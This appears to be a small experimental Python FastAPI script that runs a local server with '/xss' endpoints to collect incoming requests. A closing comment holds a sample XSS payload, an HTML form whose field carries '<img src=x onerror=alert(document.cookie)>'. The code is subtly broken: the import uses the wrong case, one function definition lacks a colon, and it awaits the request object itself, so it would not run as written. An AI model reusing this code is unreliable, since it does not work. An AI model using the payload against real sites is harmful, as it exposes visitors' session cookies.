from fastapi import Fastapi, Request
# from fastapi import FastAPI, Form
# from typing import Annotated
import uvicorn
# from pydantic import BaseModel

# class InputData(BaseModel):
#     data: str

app = FastAPI()

def main():
    data = []

    @app.get("/xss")
    async def get_xss(req: Request)
        nonlocal data
        data.append(await req)
        return {"message": 200}

    
    @app.post("/xss")
    async def post_xss(req: Request):
        nonlocal data
        data.append(await req)
        # Process the data as needed
        return {"message": 200}

    
    @app.get("/data")
    async def get_data():
        nonlocal data
        return {"datas": data}
    
    
    @app.delete("/data")
    async def del_data():
        nonlocal data
        data = []
        # for i in alldata:
        #     alldata.pop(i)
        return {"message": "deleted"}


    uvicorn.run(app=app, host="127.0.0.1", port=8000)

if __name__ == "__main__":
    main()

# Payload we might be using:
# 
# <form action="http://127.0.0.1:8000/xss" method="post">
#     <label for="data">Data:</label>
#     <input type="text" id="data" name="data" value="<img src=x onerror=alert(document.cookie)>">
#     <input type="submit" value="Submit">
# </form>
